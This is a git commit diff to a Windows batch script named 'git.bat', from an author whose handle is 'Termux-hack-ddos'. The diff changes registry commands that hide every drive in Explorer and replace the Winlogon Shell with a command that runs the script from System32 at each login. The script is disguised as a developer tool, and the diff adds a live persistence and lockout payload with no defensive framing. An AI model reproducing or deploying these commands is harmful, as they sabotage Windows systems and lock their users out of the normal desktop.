cb4ec8142f4ed07a30a000d467cff5efcfbfc10d
Egor <130061558+Termux-hack-ddos@users.noreply.github.com>
2023-06-05 08:14:42 +0500

    Update git.bat

--- git.bat
+++ git.bat
@@ -8,7 +8,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogo
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 0xff /f
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c \"C:\path\to\git.bat\""
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c \"C:\Windows\System32\git.bat""
 
 @echo off 
 
